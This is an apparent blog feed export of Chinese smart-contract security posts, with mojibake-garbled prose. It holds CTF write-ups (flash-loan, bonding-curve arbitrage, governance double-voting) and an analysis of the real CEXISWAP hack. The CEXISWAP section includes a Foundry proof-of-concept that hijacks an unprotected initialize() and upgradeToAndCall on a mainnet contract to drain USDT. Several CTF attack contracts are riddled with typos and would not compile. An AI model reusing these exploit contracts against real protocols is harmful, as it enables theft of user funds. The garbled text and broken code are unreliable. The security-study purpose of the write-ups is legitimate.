maxRedeem(address owner) public view returns (uint256 maxShares)</code><br>å‡½æ•°è¿”å›å¯ä»¥é€šè¿‡ redeem è°ƒç”¨ä» owner ä½™é¢ä¸­èµå›çš„æœ€å¤§ä»½é¢ã€‚</p><p>previewRedeem:<code>function previewRedeem(uint256 shares) public view returns (uint256 assets)</code><br>å‡½æ•°å…è®¸ç”¨æˆ·åœ¨å½“å‰åŒºå—æ¨¡æ‹Ÿä»–ä»¬çš„èµå›æ•ˆæœã€‚</p><p>redeem:<code>function redeem(uint256 shares, address receiver, address owner) public returns (uint256 assets)</code><br>å‡½æ•°ä» owner èµå›ç‰¹å®šæ•°é‡çš„ shares å¹¶å°†åº•å±‚ä»£å¸çš„ assets ä»èµ„é‡‘åº“å‘é€åˆ° receiverã€‚</p><p>totalSupplyï¼š<code>function totalSupply() public view returns (uint256)</code><br>è¿”å›æµé€šä¸­æœªèµå›çš„èµ„é‡‘åº“ä»½é¢æ€»æ•°ã€‚</p><p>balanceOfï¼š<code>function balanceOf(address owner) public view returns (uint256)</code><br>è¿”å› owner å½“å‰æ‹¥æœ‰çš„èµ„é‡‘åº“ä»½é¢æ€»é‡ã€‚</p><h2 id="è§£é‡Š"><a href="#è§£é‡Š" class="headerlink" title="è§£é‡Š"></a>è§£é‡Š</h2><p>ä½¿ç”¨ deposit()ï¼Œä½ æŒ‡å®šè¦å­˜å…¥å¤šå°‘èµ„äº§ï¼Œå‡½æ•°å°†è®¡ç®—è¦å‘é€ç»™ä½ çš„è‚¡ä»½æ•°é‡ã€‚<br>ä½¿ç”¨ mint()ï¼Œä½ æŒ‡å®šæƒ³è¦å¤šå°‘è‚¡ä»½ï¼Œå‡½æ•°å°†è®¡ç®—ä»ä½ é‚£é‡Œè½¬ç§»å¤šå°‘ ERC20 èµ„äº§ã€‚</p><p>withdraw å’Œ redeem åˆ†åˆ«æ˜¯ deposit å’Œ mint çš„é€†æ“ä½œã€‚</p><p>ä½¿ç”¨ depositï¼Œä½ æŒ‡å®šè¦äº¤æ˜“çš„èµ„äº§æ•°é‡ï¼Œåˆçº¦è®¡ç®—ä½ å°†è·å¾—å¤šå°‘è‚¡ä»½ã€‚<br>ä½¿ç”¨ mintï¼Œä½ æŒ‡å®šæƒ³è¦çš„è‚¡ä»½æ•°é‡ï¼Œåˆçº¦è®¡ç®—è¦ä»ä½ é‚£é‡Œå–èµ°å¤šå°‘èµ„äº§ã€‚<br>åŒæ ·ï¼Œ<br>ä½¿ç”¨ withdrawï¼Œä½ å¯ä»¥æŒ‡å®šæƒ³ä»åˆçº¦ä¸­æå–å¤šå°‘èµ„äº§ï¼Œåˆçº¦å°†è®¡ç®—ä½ éœ€è¦é”€æ¯å¤šå°‘è‚¡ä»½ã€‚<br>ä½¿ç”¨ redeemï¼Œä½ æŒ‡å®šæƒ³è¦é”€æ¯å¤šå°‘è‚¡ä»½ï¼Œåˆçº¦å°†è®¡ç®—è¦è¿”è¿˜ç»™ä½ çš„èµ„äº§æ•°é‡ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> åè®® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Flash-Loaner</title>
      <link href="/2024/10/27/CTF-Flash-Loaner/"/>
      <url>/2024/10/27/CTF-Flash-Loaner/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Flash-Loaner"><a href="#CTF-Flash-Loaner" class="headerlink" title="CTF-Flash-Loaner"></a>CTF-Flash-Loaner</h1><p>é¢˜ç›®æºç ï¼š<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/flash-loaner">ç‚¹å‡»</a></p><p>é¢˜ç›®è¦æ±‚ï¼š<br>FlashLoaner åˆçº¦æ¥å—ç”¨æˆ·çš„èµ„é‡‘ä»¥ä¿ƒè¿›é—ªç”µè´·ï¼Œå…¶ä¸­ä»–ä»¬æ”¶å–å°‘é‡è´¹ç”¨ã€‚è¿™ç¬”è´¹ç”¨ä½œä¸ºæ”¶ç›Šæä¾›ç»™å‚¨æˆ·ã€‚</p><p>æ‚¨çš„ä»»åŠ¡æ˜¯ä»è¯¥åˆçº¦ä¸­æŠ½èµ° 99%+ çš„ç”¨æˆ·èµ„é‡‘ã€‚æ‚¨å¼€å§‹æ—¶æ²¡æœ‰èµ„é‡‘ã€‚</p><p>è¿™é¢˜çœ‹èµ·æ¥å°±æ˜¯å¾ˆé—ªç”µè´·ã€‚ä½†æ˜¯é˜…è¯»å®Œåï¼Œå¹¶æ²¡æœ‰å‘ç°ä¸€äº›æ¼æ´ï¼Œçªç ´å£å°±æ˜¯è¿™ä¸ªä»£ç ï¼š<code>  IFlashCallback(msg.sender).flashCallback(fee, data);</code>å¯æ˜¯æˆ‘ä»¬çš„å›æ‰§å‡½æ•°èƒ½åšäº›ä»€ä¹ˆå‘¢ï¼Œé™¤äº†è¿˜æ¬¾æˆ‘æƒ³ä¸åˆ°å…¶ä»–æ–¹å‘äº†</p><p>å†æ¬¡å®¡é˜…åˆçº¦ï¼Œå‘ç°è¿™ä¸ªé—ªç”µè´·æ˜¯ç»§æ‰¿ERC4626åˆçº¦çš„ï¼Œæ„å‘³ç€å®ƒä¹Ÿå¯ä»¥å®ç°å­˜å–åŠŸèƒ½ï¼Œæ‰€ä»¥æ€è·¯å°±æ‰“å¼€äº†ï¼Œé¦–å…ˆå€Ÿå…¥ä¸€äº›ä»£å¸ï¼Œåœ¨è°ƒç”¨depositå‡½æ•°ï¼Œå­˜å…¥é—ªç”µè´·ä¸­ï¼Œæ»¡è¶³è¿˜æ¬¾æ¡ä»¶ï¼Œç„¶åå†æ‰§è¡Œwithdrawå‡½æ•°ï¼Œåˆå°†ä»£å¸æ’¤å›</p><p>æ”»å‡»åˆçº¦ï¼š</p><pre><code>//SPDX-License-Identifier: MITpragma solidity^0.8.17;import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;interface IUniswapV2Pair&#123;     function swap(        uint amount0Out,         uint amount1Out,         address to,         bytes calldata data    ) external;&#125;interface ILoan&#123;    function deposit(uint256 assets, address receiver) external returns (uint256);    function redeem(uint256 shares,address receiver,address owner) external returns (uint256);    function flash(address recipient,uint256 amount,bytes calldata data) external;&#125;contract Hack&#123;    IUniswapV2Pair pair;    ILoan loaner;    IERC20 udsc;    constructor(address _pair,address _loaner,address udsc)&#123;        pair = IUniswapV2Pair (_pair);        loaner = Loaner(_loaner);        udsc = IERC20(_udsc);         usdc.approve(address(loaner), type(uint).max);    &#125;    function pwn () exteranl &#123;        pair.swap(100_000e18.0.address(this),new btyes(1));        udsc.transfer(msg.sender,udsc.banlanceOf(address(tihs)));    &#125;    function uniswapV2Call (address _address,uint256 amount0,uint256 amount1,bytes memory data) exteranl&#123;        loaner.flash(address(this),udsc.balanceOf(address(loaner))-1,new bytes(0));        loaner.redeem(loaner.balanceOf(address(this)),address(this),address(this));        udsc.transfer(address(pair),(amount0*103/100)+1);    &#125;    function flashCallback(uint256 fee,byte calldata) external&#123;        loaner.deposit(100_1000e18,address(this));        udsc.transfer(address(loaner),fee);    &#125;&#125;å®Œç»“ã€‚è¿™ä¸ªé¢˜å’Œå‰é¢çš„ctf-bonding-curveè¿˜æ˜¯æœ‰ç‚¹ä¸€æ ·çš„ã€‚</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CEXISWAPæ”»å‡»äº‹ä»¶åˆ†æ</title>
      <link href="/2024/10/27/CEXISWAP%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/"/>
      <url>/2024/10/27/CEXISWAP%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="æ”»å‡»ä»‹ç»"><a href="#æ”»å‡»ä»‹ç»" class="headerlink" title="æ”»å‡»ä»‹ç»"></a>æ”»å‡»ä»‹ç»</h1><p>cexiswapè¢«é»‘å®¢æ”»å‡»ï¼Œé»‘å®¢ä»ä¸­ç›—å–äº†3wçš„USDTã€‚ï¼ˆCEXISWAPæ˜¯ä¸€ä¸ªå»ä¸­å¿ƒåŒ–çš„å¤šé“¾äº¤æ˜“æ‰€ï¼Œé€šè¿‡è´¸æ˜“ç®¡é“æŠ€æœ¯åœ¨DEXå’ŒCEXä¹‹é—´æ¡¥æ¥æµåŠ¨æ€§ï¼‰</p><p>TXï¼š0xede72a74d8398875b42d92c550539d72c830d3c3271a7641ee1843dc105de59e</p><h1 id="æ”»å‡»åˆ†æ"><a href="#æ”»å‡»åˆ†æ" class="headerlink" title="æ”»å‡»åˆ†æ"></a>æ”»å‡»åˆ†æ</h1><p>æˆ‘ä»¬é€šè¿‡phalconæ¥çœ‹ã€‚æ”»å‡»åˆçº¦ç›´æ¥è°ƒç”¨å—å®³è€…çš„initialize()ï¼Œä½¿è‡ªå·±æˆä¸ºäº†adminï¼Œå†è°ƒç”¨å—å®³è€…çš„upgradeToAndCall()ï¼Œå†upgradeToAndCall()ä¸­å—å®³è€…å†æ¬¡delegatecallæ”»å‡»åˆçº¦çš„0x1de24bbfå‡½æ•°ã€‚</p><p>å¾ˆæ˜æ˜¾ï¼Œå—å®³è€…ä¸ºå¯¹initialize()è¿›è¡Œè®¿é—®é™åˆ¶ï¼Œå¯¼è‡´è¢«æ”»å‡»ã€‚</p><p>POC</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import&quot;forge-std/Test.sol&quot;;</span><br><span class="line">import&quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">// Attacker : https://etherscan.io/address/0x060c169c4517d52c4be9a1dd53e41a3328d16f04</span><br><span class="line">// Attack Contract : https://etherscan.io/address/0x8c425ee62d18b65cc975767c27c42de548d133a1</span><br><span class="line">// Vulnerable Contract : https://etherscan.io/address/0xb8a5890d53df78dee6182a6c0968696e827e3305</span><br><span class="line">// Attack Tx : 0xede72a74d8398875b42d92c550539d72c830d3c3271a7641ee1843dc105de59e</span><br><span class="line"></span><br><span class="line">interface ICEXISWAP &#123;</span><br><span class="line">    function initialize(</span><br><span class="line">        string memory name,</span><br><span class="line">        string memory ticker,</span><br><span class="line">        address _treasuryWallet,</span><br><span class="line">        address _communityWallet,</span><br><span class="line">        address _admin,</span><br><span class="line">        address _strategy</span><br><span class="line">    ) external;</span><br><span class="line"></span><br><span class="line">    function upgradeToAndCall(</span><br><span class="line">        address newImplementation,</span><br><span class="line">        bytes memory data</span><br><span class="line">    ) external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract CEXISWAPTest is Test&#123;</span><br><span class="line">    ICEXISWAP constant cexiswap = ICEXISWAP(0xB8a5890D53dF78dEE6182A6C0968696e827E3305);</span><br><span class="line">    IUSDT constant usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);</span><br><span class="line">    Exploiter public exploiter;</span><br><span class="line"></span><br><span class="line">    function setUp() public&#123;</span><br><span class="line">        vm.createSelectFork(&quot;mainnet&quot;, 18182605);</span><br><span class="line">        vm.label(address(cexiswap), &quot;CEXISWAP&quot;);</span><br><span class="line">        vm.label(address(usdt), &quot;USDT&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testexploit() public&#123;</span><br><span class="line">        exploiter = new Exploiter();</span><br><span class="line">        exploiter.exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Exploiter&#123;</span><br><span class="line">    ICEXISWAP constant cexiswap = ICEXISWAP(0xB8a5890D53dF78dEE6182A6C0968696e827E3305);</span><br><span class="line">    IUSDT constant usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);</span><br><span class="line">    bytes32 constant solt = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function exploit() public&#123;</span><br><span class="line">        cexiswap.initialize(</span><br><span class="line">            &quot;HAX&quot;,</span><br><span class="line">            &quot;HAX&quot;,</span><br><span class="line">            address(this),</span><br><span class="line">            address(this),</span><br><span class="line">            address(this),</span><br><span class="line">            address(this));</span><br><span class="line">        </span><br><span class="line">        cexiswap.upgradeToAndCall( address(this),abi.encodePacked(this.exploit2.selector));</span><br><span class="line"></span><br><span class="line">        this.killMe();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exploit2() public&#123;</span><br><span class="line">        owner = address(this);</span><br><span class="line">        </span><br><span class="line">        usdt.transfer(owner, usdt.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      function upgradeTo(address newImplementation) external &#123;</span><br><span class="line">        bytes32 _slot = solt;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            sstore(_slot, newImplementation)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     function killMe() public&#123;</span><br><span class="line">        selfdestruct(payable(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-bonding-curve</title>
      <link href="/2024/10/27/CTF-bonding-curve/"/>
      <url>/2024/10/27/CTF-bonding-curve/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-bonding-curve"><a href="#CTF-bonding-curve" class="headerlink" title="CTF-bonding-curve"></a>CTF-bonding-curve</h1><p>é¢˜ç›®ç æºï¼š<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/bonding-curve">ç‚¹å‡»</a></p><p>é¢˜ç›®è¦æ±‚ï¼š<br>ä»–ä»¬å³å°†æ¨å‡ºçš„æ¸¸æˆå‘å¸ƒäº†ä¸¤ä¸ªä»£å¸åˆåŒï¼šEMNå’ŒTOKENï¼Œå®ƒä»¬å…è®¸ä½ æ ¹æ®å„è‡ªçš„ç²˜åˆæ›²çº¿è¿›è¡Œé“¸é€ ã€‚</p><p>DAI ç”¨äºé“¸é€  EMNï¼ŒEMN ç”¨äºé“¸é€  TOKENã€‚</p><p>æ‚¨çš„ä»»åŠ¡æ˜¯çªƒå–è‡³å°‘ 50,000 ä¸ª DAIã€‚æ‚¨å¼€å§‹æ—¶æ²¡æœ‰tokenã€‚</p><p>è¿™æ¬¡æ„Ÿè§‰åé¢çš„é¢˜ç›®å°±ä¸Šéš¾åº¦äº†ï¼Œç²˜åˆæ›²çº¿å°±æ˜¯ä¸€ä¸ªæ–°çŸ¥è¯†äº†ã€‚</p><p>é¦–å…ˆè¿™ä¸ªåˆçº¦è¿™ä¸ªåˆçº¦æœ‰ç‚¹å¤šï¼Œæ…¢æ…¢æ¥åˆ†æï¼Œ<code>BancorBondingCurve</code>åˆçº¦å®ç°äº†ä¸€ä¸ªå…³é”®çš„å€ºåŠ¡æ›²çº¿ï¼Œæ•°å­¦çŸ¥è¯†å¾ˆå¤šï¼Œäº†è§£å°±è¡Œã€‚<code>EminenceCurrency</code>åˆçº¦å®ç°äº†EMN-&gt;TOkENï¼Œä¹°å…¥token,æ¶ˆè€—EMNã€‚<code>EminenceCurrencyBase</code>åˆçº¦å®ç°äº†DAI-&gt;EMN,ä¹°å…¥EMNï¼Œæ¶ˆè€—DAIï¼Œ<code>EminenceCurrencyHepler</code>åˆçº¦ï¼Œå°±æ˜¯å¯¹å€ºåŠ¡æ›²çº¿çš„å®ç°ã€‚</p><p>æ¢³ç†å®Œåï¼Œå°±æ˜¯è¦è·å¾—DAIä»£å¸ï¼Œè€Œæˆ‘ä»¬åˆæ²¡æœ‰é’±ï¼Œæ‰€ä»¥å°±åªèƒ½å€Ÿï¼Œé‚£å°±æ˜¯é—ªç”µè´·çš„å®ç°ï¼Œè¿™é“é¢˜å¾ˆå®¹æ˜“æƒ³åˆ°å¥—åˆ©ï¼Œé‚£ä¹ˆå¦‚ä½•åœ¨ä¹°å–ä¸­è·å¾—åˆ©æ¶¦ï¼Œå°±æ˜¯æˆ‘ä»¬è¦å®ç°äº†çš„</p><p>åœ¨<code>EminenceCurrencyBase</code>åˆçº¦çœ‹åˆ°ä¹°EMNçš„å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">function buy(uint _amount, uint _min) external returns (uint _bought) &#123;</span><br><span class="line">    _bought = _buy(_amount);</span><br><span class="line">    require(_bought &gt;= _min, &quot;slippage&quot;);</span><br><span class="line">    DAI.transferFrom(msg.sender, address(this), _amount);</span><br><span class="line">    _mint(msg.sender, _bought);</span><br><span class="line">    emit CashShopBuy(msg.sender, _bought, _amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹èµ·æ¥å¾ˆæ­£å¸¸<br>ä½†æ˜¯çœ‹å‘<code>EminenceCurrency</code>åˆçº¦ä¸­ä¹°tokençš„å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function claim(address _from, uint _amount) external &#123;</span><br><span class="line">       require(gamemasters[msg.sender]||npcs[msg.sender], &quot;!gm&quot;);</span><br><span class="line">       _burn(_from, _amount);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   function buy(uint _amount, uint _min) external returns (uint _bought) &#123;</span><br><span class="line">       _bought = _buy(_amount);</span><br><span class="line">       require(_bought &gt;= _min, &quot;slippage&quot;);</span><br><span class="line">       EMN.claim(msg.sender, _amount);</span><br><span class="line">       _mint(msg.sender, _bought);</span><br><span class="line">       emit CashShopBuy(msg.sender, _bought, _amount);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>å‘ç°è¿˜æ˜¯æœ‰ç‚¹åŒºåˆ«çš„ï¼Œä¸€ä¸ªæ˜¯å®ç°DAIçš„è½¬è´¦ï¼Œä¸€ä¸ªæ˜¯å®ç°EMNçš„é”€æ¯ï¼Œé‚£ä¹ˆè‡ªèº«çš„EMNé”€æ¯åï¼Œå¯¹äºå€ºåŠ¡æ›²çº¿è¿˜æ˜¯æœ‰å½±å“çš„ã€‚<br>æ‰€ä»¥ä¸€ä¸ªå¥—åˆ©æ€è·¯å°±æœ‰äº†ï¼šé¦–å…ˆä½¿ç”¨é—ªç”µè´·ï¼Œå€Ÿå…¥DAIï¼Œç„¶åç”¨å…¨éƒ¨çš„DAIè´­ä¹°EMNï¼Œå†åœ¨é—ªç”µè´·æ‰§è¡Œå›è°ƒå‡½æ•°çš„å‡½æ•°çš„æ—¶å€™ï¼Œæ‹¿å‡ºä¸€éƒ¨åˆ†çš„EMNè¿›è¡Œè´­ä¹°token,è¿™æ ·å¸‚åœºçš„EMNå°±ä¼šè¢«é”€æ¯ï¼Œé‚£ä¹ˆå°±å½±å“åˆ°äº†æ­¤æ—¶çš„EMNçš„ä»·æ ¼ï¼Œç„¶ååœ¨é€šè¿‡swapæŠŠtokenäº¤æ¢æˆEMNï¼Œæˆ‘ä»¬åœ¨è¿›è¡Œé«˜ä»·å‡ºå”®EMNï¼Œå°±èƒ½è·å¾—æ›´å¤šçš„DAIï¼Œç„¶åè¿˜é’±ï¼Œå‰©ä¸‹çš„DAIå°±å½’æˆ‘ä»¬æ‰€æœ‰ã€‚</p><p>æ”»å‡»åˆçº¦å¦‚ä¸‹ï¼š</p><pre><code>//SPDX-License-Identifier:MITpragma solidity ^0.8.17;//å› ä¸ºéœ€è¦é—ªç”µè´·ï¼Œä½¿ç”¨unisawpV2æ¥è¿›è¡Œinterface IUinswapV2Pair&#123;  function swap(uint amount0,uint amoun2,address to,bytes calldata data) exteranl;&#125;interface IEminceCurrency&#123;    function buy(uint _amount, uint _min) external returns (uint _bought);     function sell(uint _amount, uint _min) external returns (uint _bought) ;&#125;interface TokenERC20&#123;  function balanceOf(address token) exteranl ; function approve(address spender, uint256 amount) external ;&#125;contract Hack&#123;    IUniswapV2Pair pair;    IEminceCurrency buyemn;    IEminceCurrency buytoken;    TokenERC20 dai     constructor(address _pair,address _buyemn;address buytoken,address _dai)    &#123;        pair = IUniswapV2Pair(_pair);        buyemn = IEminceCurrency(_buyemn);        buytoken = IEminceCurrency(_buytoken);        dai = TokenERC20(_dai);    &#125;   function pwn (uint256 amount) exteranl &#123;    pair.swap(0,amount,address(this),bytes())   &#125;   function uiswapV2call (address _sender,uint256 amount0,uint256 amount1,bytes calldata _data) exteranl &#123;        uint256 daiamount =dai.balanceOf(address(this));        dai.approve(address(buyemn),type.(uint256).max);        dai.approve(address(buytoken),type(uint256).max);         //ä¹°å…¥EMNï¼›        uint256 buy1amount = buyemn.buy(daiamount,0);        //ç”¨1/2çš„EMNï¼Œä¹°å…¥tokenï¼Œæ­¤æ—¶ä¼šé”€æ¯EMNï¼Œå¯¼è‡´EMNçš„ä»·æ ¼é¢å‡é«˜        uint256 buy2amount = buytoken.buy(buy1amount/2,0);        //å‡ºå”®EMN        uint256 sell1amount = buyemn.sell(buy1amount/2,0);        //å‡ºå”®tokenè·å¾—EMN        uint256 sell2amount = buytoken.sell(buy2amount,0);        //å‡ºå”®å‰©ä¸‹çš„EMN        uint256 sell3amount = buyemn.sell(sell2amount,0);        uint256 daitotal = sell1amount + sell3amount;        //è¿˜æœ¬é‡‘åŠ åˆ©æ¯        uint256 returnamount = (amount1*(10**18)*1000/997/(10**18))+1;        dai.transfer (msg.sender,returnamount);        //å°†å‰©ä¸‹çš„daiå‘é€ç»™æˆ‘ä»¬è‡ªå·±        dai.transfer(tx.origin,(daitotal-returnamount));   &#125;&#125;å®Œç»“ï¼Œä¸ªäººè®¤ä¸ºï¼Œå°±æ˜¯é¦–å…ˆï¼Œè¦æƒ³åˆ°ä½¿ç”¨é—ªç”µè´·ï¼Œä½¿ç”¨å¥—åˆ©ï¼Œå‘ç°æ¼æ´çš„å­˜åœ¨ã€‚</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-governance-shenamigans</title>
      <link href="/2024/10/25/CTF-governance-shenamigans/"/>
      <url>/2024/10/25/CTF-governance-shenamigans/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-governance-shenamigans"><a href="#CTF-governance-shenamigans" class="headerlink" title="CTF-governance-shenamigans"></a>CTF-governance-shenamigans</h1><p>é¢˜ç›®æºç ï¼š<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/governance-shenanigans">ç‚¹å‡»</a></p><p>è¦æ±‚æ˜¯;<br>NotSushiToken æ²»ç†ä»£å¸åˆçº¦å·²ç»ä¸Šçº¿ï¼Œæ—¨åœ¨å†³å®šè°æ˜¯æœ€ä½³å¯¿å¸å¨å¸ˆã€‚è°ä¸æƒ³è¦è¿™æ ·çš„è£è€€å‘¢ï¼Ÿ<br>è¯¥åˆçº¦åªå…è®¸ WLed åœ°å€æŠ•ç¥¨ã€‚å¹¸è¿çš„æ˜¯ï¼Œä½ çš„ Sybil æ”»å‡»è®©ä½ è·å¾—äº† 3 ä¸ªå¯ä»¥æŠ•ç¥¨çš„ WLed åœ°å€ã€‚<br>ä½ çš„ç›®æ ‡æ˜¯è·å¾—æœ€å¤šçš„å§”æ‰˜æŠ•ç¥¨ï¼Œæˆä¸ºçœŸæ­£çš„å¯¿å¸ä¹‹ç‹ã€‚ä½ æ‰‹ä¸­æœ‰ 500 ä¸ªä»£å¸ï¼Œè€Œä½ çš„ç«äº‰å¯¹æ‰‹æœ‰ 2000 ä¸ªã€‚</p><p>ä»é¢˜ç›®ä¸­å°±å¯ä»¥å¾—åˆ°ä¸€ç‚¹æ–¹å‘ï¼Œå°±æ˜¯æœ‰3ä¸ªå¯ä»¥æŠ•ç¥¨çš„åœ°å€ï¼Œè¯´æ˜æˆ‘ä»¬è‚¯å®šè¦è¿ç”¨èµ·æ¥</p><p>æ•´ä¸ªåˆçº¦çš„é€»è¾‘å°±æ˜¯å§”æ‰˜æŠ•ç¥¨ï¼Œé‚£ä¹ˆå¦‚æœï¼Œæˆ‘ä»¬å°†åŸæœ‰çš„500 ä¸ªä»£å¸ï¼Œå§”æ‰˜ç»™é‚£3ä¸ªåœ°å€ï¼Œç»™æˆ‘ä»¬æŠ•ç¥¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸å°±æœ‰å¾ˆå¤šç¥¨äº†å—</p><p>çœ‹å‘ä»£ç ï¼Œå…è®¸æˆ‘ä»¬è¿™ä¹ˆåšå—</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _delegate(address delegator, address delegatee)</span><br><span class="line">       internal</span><br><span class="line">   &#123;</span><br><span class="line">       address currentDelegate = _delegates[delegator];</span><br><span class="line">       uint256 delegatorBalance = balanceOf(delegator); // balance of underlying SUSHIs (not scaled);</span><br><span class="line">       _delegates[delegator] = delegatee;</span><br><span class="line"></span><br><span class="line">       emit DelegateChanged(delegator, currentDelegate, delegatee);</span><br><span class="line"></span><br><span class="line">       _moveDelegates(currentDelegate, delegatee, delegatorBalance);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   /// @dev votes are transfered from delegatee `srcRep` to `dstRep`</span><br><span class="line">   function _moveDelegates(address srcRep, address dstRep, uint256 amount) internal &#123;</span><br><span class="line">       if (srcRep != dstRep &amp;&amp; amount &gt; 0) &#123;</span><br><span class="line">           if (srcRep != address(0)) &#123;</span><br><span class="line">               // decrease old representative</span><br><span class="line">               uint32 srcRepNum = numCheckpoints[srcRep];</span><br><span class="line">               uint256 srcRepOld = srcRepNum &gt; 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;</span><br><span class="line">               uint256 srcRepNew = srcRepOld.sub(amount);</span><br><span class="line">               _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           if (dstRep != address(0)) &#123;</span><br><span class="line">               // increase new representative</span><br><span class="line">               uint32 dstRepNum = numCheckpoints[dstRep];</span><br><span class="line">               uint256 dstRepOld = dstRepNum &gt; 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0;</span><br><span class="line">               uint256 dstRepNew = dstRepOld.add(amount);</span><br><span class="line">               _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>å‘ç°æ²¡æœ‰ä»€ä¹ˆé™åˆ¶ï¼Œå°±èƒ½æ›´æ–° <code>_delegates[delegator] = delegatee</code> ä»£è¡¨è€…,  ä¹Ÿå°±æ˜¯è¯´åˆšåˆšé‚£ä¸ªæƒ³æ³•å°±å¯å®ç°</p><p>æ”»å‡»æ€è·¯ï¼š<br>ä¸‰ä¸ªåœ°å€ï¼Œattracker,B,C,<br>attracterå‘é€500ä»£å¸ç»™Bï¼ŒBåœ¨å§”æ‰˜ç»™attracker,  æ­¤æ—¶attrackerçš„æŠ•ç¥¨æ•°500ï¼›<br>Bå°†500ä»£å¸å‘é€ç»™Cï¼ŒCåœ¨å§”æ‰˜ç»™attracker,æ­¤æ­¤æ—¶attrcakerçš„æŠ•ç¥¨æ•°ä¸º1000ï¼›<br>Cå°†500ä»£å¸å‘é€ç»™attracker,attrackeråœ¨å†é‡å¤å‰é¢çš„å·¥ä½œï¼Œç›´è‡³æŠ•ç¥¨æ•°è¶…è¿‡2000ï¼›</p><p>ä¸ªäººè®¤ä¸º,è¿™ä¸ªåˆçº¦æ¼æ´æ˜¯ï¼Œå¯ä»¥éšæ„æ›´æ–°ä»£è¡¨è€…ï¼Œå¹¶ä¸”å§”æ‰˜äººçš„tokenä¼šç•™åœ¨å®ƒè‡ªå·±è¿™å„¿ï¼Œå°±å¥½åƒåŒèŠ±ä¸€æ ·ï¼Œä»£å¸è¢«é‡å¤ä½¿ç”¨ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-MasterChef</title>
      <link href="/2024/10/25/CTF-MasterChef/"/>
      <url>/2024/10/25/CTF-MasterChef/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-MasterChef"><a href="#CTF-MasterChef" class="headerlink" title="CTF-MasterChef"></a>CTF-MasterChef</h1><p>é¢˜ç›®æºç ;<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/inflationary-net-worth">ç‚¹å‡»</a></p><p>è¦æ±‚æ˜¯ï¼š<br>æœ‰ä¸€ä¸ª MasterChef åˆçº¦ï¼Œå®ƒæ¥å— MULA ä»£å¸å¹¶å‘è´¨æŠ¼è€…é“¸é€  MUNY ä½œä¸ºå¥–åŠ±ã€‚</p><p>MULA å…·æœ‰é€šç¼©è½¬è´¦ç¨æœºåˆ¶ï¼Œæ¯æ¬¡è½¬è´¦ä¼šé”€æ¯ 5% çš„æ•°é‡ï¼Œä»¥æœ‰æ•ˆæ¿€åŠ±é•¿æœŸæŒæœ‰è€…ã€‚</p><p>ä½ çš„ä»»åŠ¡æ˜¯æ¬ºéª— MasterChefï¼Œä½¿å…¶ä¸ºä½ é“¸é€ åˆ†é…ç»™æ‰€æœ‰è´¨æŠ¼è€…çš„æ‰€æœ‰ MUNYã€‚ä½ å¼€å§‹æ—¶æ‹¥æœ‰ 10,000 MULAã€‚</p><p>çœ‹åˆ°æœ‰æºä»£ç 